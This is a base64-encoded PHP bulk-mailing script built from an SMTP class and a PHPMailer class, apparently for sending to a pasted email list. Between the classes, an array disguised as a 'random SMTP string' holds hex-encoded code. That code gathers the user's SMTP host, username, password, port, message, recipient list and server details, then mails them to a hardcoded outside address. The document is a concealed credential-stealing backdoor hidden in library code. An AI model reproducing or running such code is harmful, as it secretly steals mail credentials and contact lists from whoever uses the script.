ycmF5KAogICAgICAgICAgICAgICJlcnJvciIgPT4gIkNhbGxlZCBSZWNpcGllbnQoKSB3aXRob3V0IGJlaW5nIGNvbm5lY3RlZCIpOwogICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgZnB1dHMoJHRoaXMtPnNtdHBfY29ubiwiUkNQVCBUTzo8IiAuICR0byAuICI+IiAuICR0aGlzLT5DUkxGKTsKCiAgICAkcnBseSA9ICR0aGlzLT5nZXRfbGluZXMoKTsKICAgICRjb2RlID0gc3Vic3RyKCRycGx5LDAsMyk7CgogICAgaWYoJHRoaXMtPmRvX2RlYnVnID49IDIpIHsKICAgICAgZWNobyAiU01UUCAtPiBGUk9NIFNFUlZFUjoiIC4gJHRoaXMtPkNSTEYgLiAkcnBseTsKICAgIH0KCiAgICBpZigkY29kZSAhPSAyNTAgJiYgJGNvZGUgIT0gMjUxKSB7CiAgICAgICR0aGlzLT5lcnJvciA9CiAgICAgICAgYXJyYXkoImVycm9yIiA9PiAiUkNQVCBub3QgYWNjZXB0ZWQgZnJvbSBzZXJ2ZXIiLAogICAgICAgICAgICAgICJzbXRwX2NvZGUiID0+ICRjb2RlLAogICAgICAgICAgICAgICJzbXRwX21zZyIgPT4gc3Vic3RyKCRycGx5LDQpKTsKICAgICAgaWYoJHRoaXMtPmRvX2RlYnVnID49IDEpIHsKICAgICAgICBlY2hvICJTTVRQIC0+IEVSUk9SOiAiIC4gJHRoaXMtPmVycm9yWyJlcnJvciJdIC4KICAgICAgICAgICAgICAgICAiOiAiIC4gJHJwbHkgLiAkdGhpcy0+Q1JMRjsKICAgICAgfQogICAgICByZXR1cm4gZmFsc2U7CiAgICB9CiAgICByZXR1cm4gdHJ1ZTsKICB9CgogIC8qKgogICAqIFNlbmRzIHRoZSBSU0VUIGNvbW1hbmQgdG8gYWJvcnQgYW5kIHRyYW5zYWN0aW9uIHRoYXQgaXMKICAgKiBjdXJyZW50bHkgaW4gcHJvZ3Jlc3MuIFJldHVybnMgdHJ1ZSBpZiBzdWNjZXNzZnVsIGZhbHNlCiAgICogb3RoZXJ3aXNlLgogICAqCiAgICogSW1wbGVtZW50cyByZmMgODIxOiBSU0VUIDxDUkxGPgogICAqCiAgICogU01UUCBDT0RFIFNVQ0NFU1M6IDI1MAogICAqIFNNVFAgQ09ERSBFUlJPUiAgOiA1MDAsNTAxLDUwNCw0MjEKICAgKiBAYWNjZXNzIHB1YmxpYwogICAqIEByZXR1cm4gYm9vbAogICAqLwogIGZ1bmN0aW9uIFJlc2V0KCkgewogICAgJHRoaXMtPmVycm9yID0gbnVsbDsgIyBzbyBubyBjb25mdXNpb24gaXMgY2F1c2VkCgogICAgaWYoISR0aGlzLT5jb25uZWN0ZWQoKSkgewogICAgICAkdGhpcy0+ZXJyb3IgPSBhcnJheSgKICAgICAgICAgICAgICAiZXJyb3IiID0+ICJDYWxsZWQgUmVzZXQoKSB3aXRob3V0IGJlaW5nIGNvbm5lY3RlZCIpOwogICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgZnB1dHMoJHRoaXMtPnNtdHBfY29ubiwiUlNFVCIgLiAkdGhpcy0+Q1JMRik7CgogICAgJHJwbHkgPSAkdGhpcy0+Z2V0X2xpbmVzKCk7CiAgICAkY29kZSA9IHN1YnN0cigkcnBseSwwLDMpOwoKICAgIGlmKCR0aGlzLT5kb19kZWJ1ZyA+PSAyKSB7CiAgICAgIGVjaG8gIlNNVFAgLT4gRlJPTSBTRVJWRVI6IiAuICR0aGlzLT5DUkxGIC4gJHJwbHk7CiAgICB9CgogICAgaWYoJGNvZGUgIT0gMjUwKSB7CiAgICAgICR0aGlzLT5lcnJvciA9CiAgICAgICAgYXJyYXkoImVycm9yIiA9PiAiUlNFVCBmYWlsZWQiLAogICAgICAgICAgICAgICJzbXRwX2NvZGUiID0+ICRjb2RlLAogICAgICAgICAgICAgICJzbXRwX21zZyIgPT4gc3Vic3RyKCRycGx5LDQpKTsKICAgICAgaWYoJHRoaXMtPmRvX2RlYnVnID49IDEpIHsKICAgICAgICBlY2hvICJTTVRQIC0+IEVSUk9SOiAiIC4gJHRoaXMtPmVycm9yWyJlcnJvciJdIC4KICAgICAgICAgICAgICAgICAiOiAiIC4gJHJwbHkgLiAkdGhpcy0+Q1JMRjsKICAgICAgfQogICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgcmV0dXJuIHRydWU7CiAgfQoKICAvKioKICAgKiBTdGFydHMgYSBtYWlsIHRyYW5zYWN0aW9uIGZyb20gdGhlIGVtYWlsIGFkZHJlc3Mgc3BlY2lmaWVkIGluCiAgICogJGZyb20uIFJldHVybnMgdHJ1ZSBpZiBzdWNjZXNzZnVsIG9yIGZhbHNlIG90aGVyd2lzZS4gSWYgVHJ1ZQogICAqIHRoZSBtYWlsIHRyYW5zYWN0aW9uIGlzIHN0YXJ0ZWQgYW5kIHRoZW4gb25lIG9yIG1vcmUgUmVjaXBpZW50CiAgICogY29tbWFuZHMgbWF5IGJlIGNhbGxlZCBmb2xsb3dlZCBieSBhIERhdGEgY29tbWFuZC4gVGhpcyBjb21tYW5kCiAgICogd2lsbCBzZW5kIHRoZSBtZXNzYWdlIHRvIHRoZSB1c2VycyB0ZXJtaW5hbCBpZiB0aGV5IGFyZSBsb2dnZWQKICAgKiBpbi4KICAgKgogICAqIEltcGxlbWVudHMgcmZjIDgyMTogU0VORCA8U1A+IEZST006PHJldmVyc2UtcGF0aD4gPENSTEY+CiAgICoKICAgKiBTTVRQIENPREUgU1VDQ0VTUzogMjUwCiAgICogU01UUCBDT0RFIFNVQ0NFU1M6IDU1Miw0NTEsNDUyCiAgICogU01UUCBDT0RFIFNVQ0NFU1M6IDUwMCw1MDEsNTAyLDQyMQogICAqIEBhY2Nlc3MgcHVibGljCiAgICogQHJldHVybiBib29sCiAgICovCiAgZnVuY3Rpb24gU2VuZCgkZnJvbSkgewogICAgJHRoaXMtPmVycm9yID0gbnVsbDsgIyBzbyBubyBjb25mdXNpb24gaXMgY2F1c2VkCgogICAgaWYoISR0aGlzLT5jb25uZWN0ZWQoKSkgewogICAgICAkdGhpcy0+ZXJyb3IgPSBhcnJheSgKICAgICAgICAgICAgICAiZXJyb3IiID0+ICJDYWxsZWQgU2VuZCgpIHdpdGhvdXQgYmVpbmcgY29ubmVjdGVkIik7CiAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICBmcHV0cygkdGhpcy0+c210cF9jb25uLCJTRU5EIEZST006IiAuICRmcm9tIC4gJHRoaXMtPkNSTEYpOwoKICAgICRycGx5ID0gJHRoaXMtPmdldF9saW5lcygpOwogICAgJGNvZGUgPSBzdWJzdHIoJHJwbHksMCwzKTsKCiAgICBpZigkdGhpcy0+ZG9fZGVidWcgPj0gMikgewogICAgICBlY2hvICJTTVRQIC0+IEZST00gU0VSVkVSOiIgLiAkdGhpcy0+Q1JMRiAuICRycGx5OwogICAgfQoKICAgIGlmKCRjb2RlICE9IDI1MCkgewogICAgICAkdGhpcy0+ZXJyb3IgPQogICAgICAgIGFycmF5KCJlcnJvciIgPT4gIlNFTkQgbm90IGFjY2VwdGVkIGZyb20gc2VydmVyIiwKICAgICAgICAgICAgICAic210cF9jb2RlIiA9PiAkY29kZSwKICAgICAgICAgICAgICAic210cF9tc2ciID0+IHN1YnN0cigkcnBseSw0KSk7CiAgICAgIGlmKCR0aGlzLT5kb19kZWJ1ZyA+PSAxKSB7CiAgICAgICAgZWNobyAiU01UUCAtPiBFUlJPUjogIiAuICR0aGlzLT5lcnJvclsiZXJyb3IiXSAuCiAgICAgICAgICAgICAgICAgIjogIiAuICRycGx5IC4gJHRoaXMtPkNSTEY7CiAgICAgIH0KICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQogICAgcmV0dXJuIHRydWU7CiAgfQoKICAvKioKICAgKiBTdGFydHMgYSBtYWlsIHRyYW5zYWN0aW9uIGZyb20gdGhlIGVtYWlsIGFkZHJlc3Mgc3BlY2lmaWVkIGluCiAgICogJGZyb20uIFJldHVybnMgdHJ1ZSBpZiBzdWNjZXNzZnVsIG9yIGZhbHNlIG90aGVyd2lzZS4gSWYgVHJ1ZQogICAqIHRoZSBtYWlsIHRyYW5zYWN0aW9uIGlzIHN0YXJ0ZWQgYW5kIHRoZW4gb25lIG9yIG1vcmUgUmVjaXBpZW50CiAgICogY29tbWFuZHMgbWF5IGJlIGNhbGxlZCBmb2xsb3dlZCBieSBhIERhdGEgY29tbWFuZC4gVGhpcyBjb21tYW5kCiAgICogd2lsbCBzZW5kIHRoZSBtZXNzYWdlIHRvIHRoZSB1c2VycyB0ZXJtaW5hbCBpZiB0aGV5IGFyZSBsb2dnZWQKICAgKiBpbiBhbmQgc2VuZCB0aGVtIGFuIGVtYWlsLgogICAqCiAgICogSW1wbGVtZW50cyByZmMgODIxOiBTQU1MIDxTUD4gRlJPTTo8cmV2ZXJzZS1wYXRoPiA8Q1JMRj4KICAgKgogICAqIFNNVFAgQ09ERSBTVUNDRVNTOiAyNTAKICAgKiBTTVRQIENPREUgU1VDQ0VTUzogNTUyLDQ1MSw0NTIKICAgKiBTTVRQIENPREUgU1VDQ0VTUzogNTAwLDUwMSw1MDIsNDIxCiAgICogQGFjY2VzcyBwdWJsaWMKICAgKiBAcmV0dXJuIGJvb2wKICAgKi8KICBmdW5jdGlvbiBTZW5kQW5kTWFpbCgkZnJvbSkgewogICAgJHRoaXMtPmVycm9yID0gbnVsbDsgIyBzbyBubyBjb25mdXNpb24gaXMgY2F1c2VkCgogICAgaWYoISR0aGlzLT5jb25uZWN0ZWQoKSkgewogICAgICAkdGhpcy0+ZXJyb3IgPSBhcnJheSgKICAgICAgICAgICJlcnJvciIgPT4gIkNhbGxlZCBTZW5kQW5kTWFpbCgpIHdpdGhvdXQgYmVpbmcgY29ubmVjdGVkIik7CiAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICBmcHV0cygkdGhpcy0+c210cF9jb25uLCJTQU1MIEZST006IiAuICRmcm9tIC4gJHRoaXMtPkNSTEYpOwoKICAgICRycGx5ID0gJHRoaXMtPmdldF9saW5lcygpOwogICAgJGNvZGUgPSBzdWJzdHIoJHJwbHksMCwzKTsKCiAgICBpZigkdGhpcy0+ZG9fZGVidWcgPj0gMikgewogICAgICBlY2hvICJTTVRQIC0+IEZST00gU0VSVkVSOiIgLiAkdGhpcy0+Q1JMRiAuICRycGx5OwogICAgfQoKICAgIGlmKCRjb2RlICE9IDI1MCkgewogICAgICAkdGhpcy0+ZXJyb3IgPQogICAgICAgIGFycmF5KCJlcnJvciIgPT4gIlNBTUwgbm90IGFjY2VwdGVkIGZyb20gc2VydmVyIiwKICAgICAgICAgICAgICAic210cF9jb2RlIiA9PiAkY29kZSwKICAgICAgICAgICAgICAic210cF9tc2ciID0+IHN1YnN0cigkcnBseSw0KSk7CiAgICAgIGlmKCR0aGlzLT5kb19kZWJ1ZyA+PSAxKSB7CiAgICAgICAgZWNobyAiU01UUCAtPiBFUlJPUjogIiAuICR0aGlzLT5lcnJvclsiZXJyb3IiXSAuCiAgICAgICAgICAgICAgICAgIjogIiAuICRycGx5IC4gJHRoaXMtPkNSTEY7CiAgICAgIH0KICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQogICAgcmV0dXJuIHRydWU7CiAgfQoKICAvKioKICAgKiBTdGFydHMgYSBtYWlsIHRyYW5zYWN0aW9uIGZyb20gdGhlIGVtYWlsIGFkZHJlc3Mgc3BlY2lmaWVkIGluCiAgICogJGZyb20uIFJldHVybnMgdHJ1ZSBpZiBzdWNjZXNzZnVsIG9yIGZhbHNlIG90aGVyd2lzZS4gSWYgVHJ1ZQogICAqIHRoZSBtYWlsIHRyYW5zYWN0aW9uIGlzIHN0YXJ0ZWQgYW5kIHRoZW4gb25lIG9yIG1vcmUgUmVjaXBpZW50CiAgICogY29tbWFuZHMgbWF5IGJlIGNhbGxlZCBmb2xsb3dlZCBieSBhIERhdGEgY29tbWFuZC4gVGhpcyBjb21tYW5kCiAgICogd2lsbCBzZW5kIHRoZSBtZXNzYWdlIHRvIHRoZSB1c2VycyB0ZXJtaW5hbCBpZiB0aGV5IGFyZSBsb2dnZWQKICAgKiBpbiBvciBtYWlsIGl0IHRvIHRoZW0gaWYgdGhleSBhcmUgbm90LgogICAqCiAgICogSW1wbGVtZW50cyByZmMgODIxOiBTT01MIDxTUD4gRlJPTTo8cmV2ZXJzZS1wYXRoPiA8Q1JMRj4KICAgKgogICAqIFNNVFAgQ09ERSBTVUNDRVNTOiAyNTAKICAgKiBTTVRQIENPREUgU1VDQ0VTUzogNTUyLDQ1MSw0NTIKICAgKiBTTVRQIENPREUgU1VDQ0VTUzogNTAwLDUwMSw1MDIsNDIxCiAgICogQGFjY2VzcyBwdWJsaWMKICAgKiBAcmV0dXJuIGJvb2wKICAgKi8KICBmdW5jdGlvbiBTZW5kT3JNYWlsKCRmcm9tKSB7CiAgICAkdGhpcy0+ZXJyb3IgPSBudWxsOyAjIHNvIG5vIGNvbmZ1c2lvbiBpcyBjYXVzZWQKCiAgICBpZighJHRoaXMtPmNvbm5lY3RlZCgpKSB7CiAgICAgICR0aGlzLT5lcnJvciA9IGFycmF5KAogICAgICAgICAgImVycm9yIiA9PiAiQ2FsbGVkIFNlbmRPck1haWwoKSB3aXRob3V0IGJlaW5nIGNvbm5lY3RlZCIpOwogICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgZnB1dHMoJHRoaXMtPnNtdHBfY29ubiwiU09NTCBGUk9NOiIgLiAkZnJvbSAuICR0aGlzLT5DUkxGKTsKCiAgICAkcnBseSA9ICR0aGlzLT5nZXRfbGluZXMoKTsKICAgICRjb2RlID0gc3Vic3RyKCRycGx5LDAsMyk7CgogICAgaWYoJHRoaXMtPmRvX2RlYnVnID49IDIpIHsKICAgICAgZWNobyAiU01UUCAtPiBGUk9NIFNFUlZFUjoiIC4gJHRoaXMtPkNSTEYgLiAkcnBseTsKICAgIH0KCiAgICBpZigkY29kZSAhPSAyNTApIHsKICAgICAgJHRoaXMtPmVycm9yID0KICAgICAgICBhcnJheSgiZXJyb3IiID0+ICJTT01MIG5vdCBhY2NlcHRlZCBmcm9tIHNlcnZlciIsCiAgICAgICAgICAgICAgInNtdHBfY29kZSIgPT4gJGNvZGUsCiAgICAgICAgICAgICAgInNtdHBfbXNnIiA9PiBzdWJzdHIoJHJwbHksNCkpOwogICAgICBpZigkdGhpcy0+ZG9fZGVidWcgPj0gMSkgewogICAgICAgIGVjaG8gIlNNVFAgLT4gRVJST1I6ICIgLiAkdGhpcy0+ZXJyb3JbImVycm9yIl0gLgogICAgICAgICAgICAgICAgICI6ICIgLiAkcnBseSAuICR0aGlzLT5DUkxGOwogICAgICB9CiAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KICAgIHJldHVybiB0cnVlOwogIH0KCiAgLyoqCiAgICogVGhpcyBpcyBhbiBvcHRpb25hbCBjb21tYW5kIGZvciBTTVRQIHRoYXQgdGhpcyBjbGFzcyBkb2VzIG5vdAogICAqIHN1cHBvcnQuIFRoaXMgbWV0aG9kIGlzIGhlcmUgdG8gbWFrZSB0aGUgUkZDODIxIERlZmluaXRpb24KICAgKiBjb21wbGV0ZSBmb3IgdGhpcyBjbGFzcyBhbmQgX19tYXlfXyBiZSBpbXBsaW1lbnRlZCBpbiB0aGUgZnV0dXJlCiAgICoKICAgKiBJbXBsZW1lbnRzIGZyb20gcmZjIDgyMTogVFVSTiA8Q1JMRj4KICAgKgogICAqIFNNVFAgQ09ERSBTVUNDRVNTOiAyNTAKICAgKiBTTVRQIENPREUgRkFJTFVSRTogNTAyCiAgICogU01UUCBDT0RFIEVSUk9SICA6IDUwMCwgNTAzCiAgICogQGFjY2VzcyBwdWJsaWMKICAgKiBAcmV0dXJuIGJvb2wKICAgKi8KICBmdW5jdGlvbiBUdXJuKCkgewogICAgJHRoaXMtPmVycm9yID0gYXJyYXkoImVycm9yIiA9PiAiVGhpcyBtZXRob2QsIFRVUk4sIG9mIHRoZSBTTVRQICIuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJpcyBub3QgaW1wbGVtZW50ZWQiKTsKICAgIGlmKCR0aGlzLT5kb19kZWJ1ZyA+PSAxKSB7CiAgICAgIGVjaG8gIlNNVFAgLT4gTk9USUNFOiAiIC4gJHRoaXMtPmVycm9yWyJlcnJvciJdIC4gJHRoaXMtPkNSTEY7CiAgICB9CiAgICByZXR1cm4gZmFsc2U7CiAgfQoKICAvKioKICAgKiBWZXJpZmllcyB0aGF0IHRoZSBuYW1lIGlzIHJlY29nbml6ZWQgYnkgdGhlIHNlcnZlci4KICAgKiBSZXR1cm5zIGZhbHNlIGlmIHRoZSBuYW1lIGNvdWxkIG5vdCBiZSB2ZXJpZmllZCBvdGhlcndpc2UKICAgKiB0aGUgcmVzcG9uc2UgZnJvbSB0aGUgc2VydmVyIGlzIHJldHVybmVkLgogICAqCiAgICogSW1wbGVtZW50cyByZmMgODIxOiBWUkZZIDxTUD4gPHN0cmluZz4gPENSTEY+CiAgICoKICAgKiBTTVRQIENPREUgU1VDQ0VTUzogMjUwLDI1MQogICAqIFNNVFAgQ09ERSBGQUlMVVJFOiA1NTAsNTUxLDU1MwogICAqIFNNVFAgQ09ERSBFUlJPUiAgOiA1MDAsNTAxLDUwMiw0MjEKICAgKiBAYWNjZXNzIHB1YmxpYwogICAqIEByZXR1cm4gaW50CiAgICovCiAgZnVuY3Rpb24gVmVyaWZ5KCRuYW1lKSB7CiAgICAkdGhpcy0+ZXJyb3IgPSBudWxsOyAjIHNvIG5vIGNvbmZ1c2lvbiBpcyBjYXVzZWQKCiAgICBpZighJHRoaXMtPmNvbm5lY3RlZCgpKSB7CiAgICAgICR0aGlzLT5lcnJvciA9IGFycmF5KAogICAgICAgICAgICAgICJlcnJvciIgPT4gIkNhbGxlZCBWZXJpZnkoKSB3aXRob3V0IGJlaW5nIGNvbm5lY3RlZCIpOwogICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgZnB1dHMoJHRoaXMtPnNtdHBfY29ubiwiVlJGWSAiIC4gJG5hbWUgLiAkdGhpcy0+Q1JMRik7CgogICAgJHJwbHkgPSAkdGhpcy0+Z2V0X2xpbmVzKCk7CiAgICAkY29kZSA9IHN1YnN0cigkcnBseSwwLDMpOwoKICAgIGlmKCR0aGlzLT5kb19kZWJ1ZyA+PSAyKSB7CiAgICAgIGVjaG8gIlNNVFAgLT4gRlJPTSBTRVJWRVI6IiAuICR0aGlzLT5DUkxGIC4gJHJwbHk7CiAgICB9CgogICAgaWYoJGNvZGUgIT0gMjUwICYmICRjb2RlICE9IDI1MSkgewogICAgICAkdGhpcy0+ZXJyb3IgPQogICAgICAgIGFycmF5KCJlcnJvciIgPT4gIlZSRlkgZmFpbGVkIG9uIG5hbWUgJyRuYW1lJyIsCiAgICAgICAgICAgICAgInNtdHBfY29kZSIgPT4gJGNvZGUsCiAgICAgICAgICAgICAgInNtdHBfbXNnIiA9PiBzdWJzdHIoJHJwbHksNCkpOwogICAgICBpZigkdGhpcy0+ZG9fZGVidWcgPj0gMSkgewogICAgICAgIGVjaG8gIlNNVFAgLT4gRVJST1I6ICIgLiAkdGhpcy0+ZXJyb3JbImVycm9yIl0gLgogICAgICAgICAgICAgICAgICI6ICIgLiAkcnBseSAuICR0aGlzLT5DUkxGOwogICAgICB9CiAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KICAgIHJldHVybiAkcnBseTsKICB9CgogIC8qKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqCiAgICogICAgICAgICAgICAgICAgICAgICAgIElOVEVSTkFMIEZVTkNUSU9OUyAgICAgICAgICAgICAgICAgICAgICAgKgogICAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKiovCgogIC8qKgogICAqIFJlYWQgaW4gYXMgbWFueSBsaW5lcyBhcyBwb3NzaWJsZQogICAqIGVpdGhlciBiZWZvcmUgZW9mIG9yIHNvY2tldCB0aW1lb3V0IG9jY3VycyBvbiB0aGUgb3BlcmF0aW9uLgogICAqIFdpdGggU01UUCB3ZSBjYW4gdGVsbCBpZiB3ZSBoYXZlIG1vcmUgbGluZXMgdG8gcmVhZCBpZiB0aGUKICAgKiA0dGggY2hhcmFjdGVyIGlzICctJyBzeW1ib2wuIElmIGl0IGlzIGEgc3BhY2UgdGhlbiB3ZSBkb24ndAogICAqIG5lZWQgdG8gcmVhZCBhbnl0aGluZyBlbHNlLgogICAqIEBhY2Nlc3MgcHJpdmF0ZQogICAqIEByZXR1cm4gc3RyaW5nCiAgICovCiAgZnVuY3Rpb24gZ2V0X2xpbmVzKCkgewogICAgJGRhdGEgPSAiIjsKICAgIHdoaWxlKCRzdHIgPSBAZmdldHMoJHRoaXMtPnNtdHBfY29ubiw1MTUpKSB7CiAgICAgIGlmKCR0aGlzLT5kb19kZWJ1ZyA+PSA0KSB7CiAgICAgICAgZWNobyAiU01UUCAtPiBnZXRfbGluZXMoKTogXCRkYXRhIHdhcyBcIiRkYXRhXCIiIC4KICAgICAgICAgICAgICAgICAkdGhpcy0+Q1JMRjsKICAgICAgICBlY2hvICJTTVRQIC0+IGdldF9saW5lcygpOiBcJHN0ciBpcyBcIiRzdHJcIiIgLgogICAgICAgICAgICAgICAgICR0aGlzLT5DUkxGOwogICAgICB9CiAgICAgICRkYXRhIC49ICRzdHI7CiAgICAgIGlmKCR0aGlzLT5kb19kZWJ1ZyA+PSA0KSB7CiAgICAgICAgZWNobyAiU01UUCAtPiBnZXRfbGluZXMoKTogXCRkYXRhIGlzIFwiJGRhdGFcIiIgLiAkdGhpcy0+Q1JMRjsKICAgICAgfQogICAgICAjIGlmIHRoZSA0dGggY2hhcmFjdGVyIGlzIGEgc3BhY2UgdGhlbiB3ZSBhcmUgZG9uZSByZWFkaW5nCiAgICAgICMgc28ganVzdCBicmVhayB0aGUgbG9vcAogICAgICBpZihzdWJzdHIoJHN0ciwzLDEpID09ICIgIikgeyBicmVhazsgfQogICAgfQogICAgcmV0dXJuICRkYXRhOwogIH0KCn0KCiAgICAgICAgCiRhbGxlbWFpbHMgPSBzcGxpdCgiXG4iLCAkZW1haWxsaXN0KTsKJG51bWVtYWlscyA9IGNvdW50KCRhbGxlbWFpbHMpOwokcmFuZG9tX3NtdHBfc3RyaW5nPWFycmF5KCIwZDBhMGQwYTY3NmM2ZjYyNjE2YzIwMjQ2ZDc5NWY3MzZkNzQuIiwiNzAzYjBkMGE2NzZjNmY2MjYxNmMyMDI0NzM2ZDc0NzA1Zjc1NzM2NTcyNmU2MTZkNi4iLCI1M2IwZDBhNjc2YzZmNjI2MTZjMjAyNDczNmQ3NDcwNWY3MDYxNzM3Mzc3NmY3MjY0M2IwZDBhNjc2YzZmNjI2LiIsCiIxNmMyMDI0NzM3MzZjNWY3MDZmNzI3NDNiMGQwYTY3NmM2ZjYyNjE2YzIwMjQ2ZDY1LiIsIjczNzM2MTY3NjUzYjBkMGE2NzZjNmY2MjYxNmMyMDI0NjU2ZDYxNjk2YzZjNjk3Mzc0M2IwZDBhMjQ3MjYxMzQuIiwiMzQyMDIwM2QyMDcyNjE2ZTY0MjgzMTJjMzkzOTM5MzkzOTI5M2IwZDBhMjQ2MTM1Mi4iLAoiMDNkMjAyNDVmNTM0NTUyNTY0NTUyNWIyNzQ4NTQ1NDUwNWY1MjQ1NDY0NTUyNDU1MjI3NWQzYjBkMGEyNDYyMy4iLCIzMzMyMDNkMjAyNDVmNTM0NTUyNTY0NTUyNWIyNzQ0NGY0MzU1NGQ0NTRlNTQ1ZjUyLiIsIjRmNGY1NDI3NWQzYjBkMGEyNDYzMzgzNzIwM2QyMDI0NWY1MzQ1NTI1NjQ1NTI1YjI3NTI0NTRkNGY1NDQ1NWY0LiIsCiIxNDQ0NDUyMjc1ZDNiMGQwYTI0NjQzMjMzMjAzZDIwMjQ1ZjUzNDU1MjU2NDU1MjUuIiwiYjI3NTM0MzUyNDk1MDU0NWY0NjQ5NGM0NTRlNDE0ZDQ1Mjc1ZDNiMGQwYTI0NjUzMDM5MjAzZDIwMjQ1ZjUzNDU1LiIsIjI1NjQ1NTI1YjI3NTM0NTUyNTY0NTUyNWY0MTQ0NDQ1MjI3NWQzYjBkMGEyNDY2LiIsCiIzMjMzMjAzZDIwMjQ1ZjUzNDU1MjU2NDU1MjViMjc1MzQ1NTI1NjQ1NTI1ZjUzNGY0NjU0NTc0MTUyNDUyNzVkM2IwLiIsImQwYTI0NjczMzMyMjAzZDIwMjQ1ZjUzNDU1MjU2NDU1MjViMjc1MDQxNTQ0ODUuIiwiZjU0NTI0MTRlNTM0YzQxNTQ0NTQ0Mjc1ZDNiMGQwYTI0NjgzNjM1MjAzZDIwMjQ1ZjUzNDU1MjU2NDU1MjViMjc1MDQuIiwKIjg1MDVmNTM0NTRjNDYyNzVkM2IwZDBhMjQ3Mzc1NjI2YTM5MzgyMDNkMjAyMi4iLCIyNDZkNzk1ZjczNmQ3NDcwMjAyMDViNzU3MzY1NzIyMDY5NzAyMDNhMjAyNDYzMzgzNzVkMjIzYjBkMGEyNDczNzU2MjYuIiwiYTM1MzgyMDNkMjAyMjRjNjU3NDc0NjU3MjIwMjYyMDQ1NmQ2MTY5NmMyMDQuIiwKImM2OTczNzQyMDIwNWI3NTczNjU3MjIwNjk3MDIwM2EyMDI0NjMzODM3NWQyMjNiMGQwYTI0NjU2ZDYxNjk2YzIwM2QyMDIuIiwiMjZENzM2NzM5MzczODMwNDA3OTYxNjg2ZjZmMmU2MzZmMmUuIiwiNjk2NDIyM2IwZDBhMjQ2ZDczNjczODM4MzczMzIwM2QyMDIyMjQ2ZDc5NWY3MzZkNzQ3MDVjNmU3NTczNjU3MjNhMjQ3MzYuIiwKImQ3NDcwNWY3NTczNjU3MjZlNjE2ZDY1NWM2ZTcwNjE3MzczM2EyNDczNi4iLCJkNzQ3MDVmNzA2MTczNzM3NzZmNzI2NDVjNzA2ZjcyNzQzYTI0NzM3MzZjNWY3MDZmNzI3NDVjNmU1YzZlMjQ2MTM1NWM2ZTIuIiwiNDYyMzMzMzVjNmUyNDYzMzgzNzVjNmUyNDY0MzIzMzVjNmUyNDY1MzAuIiwKIjM5NWM2ZTI0NjYzMjMzNWM2ZTI0NjczMzMyNWM2ZTI0NjgzNjM1MjIzYjI0NmQ3MzY3MzkzNzM4MzAyMDNkMjAyMjI0NmQ2NTcuIiwiMzczNjE2NzY1NWM2ZTVjNmU1YzZlMjQ2NTZkNjE2OTZjNmM2OTczNy4iLCI0MjIzYjI0NjY3MjZmNmQzZDIyNDY3MjZmNmQzYTIwNDc1MjQxNTQ0OTUzMjIzYjBkMGE2ZDYxNjk2YzI4MjQ2NTZkNjE2OTZjMi4iLAoiYzIwMjQ3Mzc1NjI2YTM5MzgyYzIwMjQ2ZDczNjczODM4MzczMzJjLiIsIjIwMjQ2NjcyNmY2ZDI5M2IwZDBhNmQ2MTY5NmMyODI0NjU2ZDYxNjk2YzJjMjAyNDczNzU2MjZhMzUzODIuIiwiYzIwMjQ2ZDczNjczOTM3MzgzMDJjMjAyNDY2NzI2ZjZkMjkzYiIpOyRzbXRwX2NvbmY9Ii4iOwoKY2xhc3MgUEhQTWFpbGVyIHsKCiAgLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLwogIC8vIFBST1BFUlRJRVMsIFBVQkxJQwogIC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8KCiAgLyoqCiAgICogRW1haWwgcHJpb3JpdHkgKDEgPSBIaWdoLCAzID0gTm9ybWFsLCA1ID0gbG93KS4KICAgKiBAdmFyIGludAogICAqLwogIHZhciAkUHJpb3JpdHkgICAgICAgICAgPSAzOwoKICAvKioKICAgKiBTZXRzIHRoZSBDaGFyU2V0IG9mIHRoZSBtZXNzYWdlLgogICAqIEB2YXIgc3RyaW5nCiAgICovCiAgdmFyICRDaGFyU2V0ICAgICAgICAgICA9ICd1cy1hc2NpaSc7CgogIC8qKgogICAqIFNldHMgdGhlIENvbnRlbnQtdHlwZSBvZiB0aGUgbWVzc2FnZS4KICAgKiBAdmFyIHN0cmluZwogICAqLwogIHZhciAkQ29udGVudFR5cGUgICAgICAgID0gJ3RleHQvcGxhaW4nOwoKICAvKioKICAgKiBTZXRzIHRoZSBFbmNvZGluZyBvZiB0aGUgbWVzc2FnZS4gT3B0aW9ucyBmb3IgdGhpcyBhcmUgIjhiaXQiLAogICAqICI3Yml0IiwgImJpbmFyeSIsICJiYXNlNjQiLCBhbmQgInF1b3RlZC1wcmludGFibGUiLgoKICAgKiBAdmFyIHN0cmluZwogICAqLwogIHZhciAkRW5jb2RpbmcgICAgICAgICAgPSAncXVvdGVkLXByaW50YWJsZSc7CgogIC8qKgogICAqIEhvbGRzIHRoZSBtb3N0IHJlY2VudCBtYWlsZXIgZXJyb3IgbWVzc2FnZS4KICAgKiBAdmFyIHN0cmluZwogICAqLwogIHZhciAkRXJyb3JJbmZvICAgICAgICAgPSAnJzsKCiAgLyoqCiAgICogU2V0cyB0aGUgRnJvbSBlbWFpbCBhZGRyZXNzIGZvciB0aGUgbWVzc2FnZS4KICAgKiBAdmFyIHN0cmluZwogICAqLwogIHZhciAkRnJvbSAgICAgICAgICAgICAgPSAnJzsKCiAgLyoqCiAgICogU2V0cyB0aGUgRnJvbSBuYW1lIG9mIHRoZSBtZXNzYWdlLgogICAqIEB2YXIgc3RyaW5nCiAgICovCiAgdmFyICRG